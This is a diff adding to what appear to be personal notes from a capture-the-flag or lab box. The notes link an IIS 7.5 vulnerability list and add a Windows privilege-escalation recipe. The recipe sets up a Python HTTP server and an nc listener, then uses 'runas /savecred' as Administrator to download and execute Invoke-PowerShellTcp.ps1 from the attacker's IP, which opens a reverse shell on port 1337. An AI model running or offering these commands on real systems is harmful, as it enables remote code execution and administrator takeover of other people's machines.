@@ -27,7 +27,16 @@ open it - https://mdbviewer.herokuapp.com/
 Microsoft IIS 7.5 vuln:
 https://www.cvedetails.com/vulnerability-list.php?vendor_id=26&product_id=3436&version_id=92758&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&cweid=0&order=1&trc=5&sha=a2bdb2ecdf4e4f1e07a98d4381990b73ffa6e3f9
 
-
-
-
 runas /user:Administrator /savecred
+# - on my machine
+
+#  ifconfig -> 10.10.13.133 & tun0 interface
+#  tcpdump -i tun0 icmp 
+dir powershell.exe /s /p         ->  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+# Invoke-PowerShellTcp -Reverse -IPAddress 10.10.13.133 -Port 1337                -> in shell script
+# python -m SimpleHTTPServer     -> 2nd term
+# nc -lvnp 1337                  -> 3d  term
+runas /savecred /user:Administrator "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.13.133:8000/Invoke-PowerShellTcp.ps1')"
+runas /savecred /user:Administrator "C:\Users\Administrator\Invoke-PowerShellTcp -Reverse -IPAddress 10.10.13.133 -Port 1337"
+
+enjou
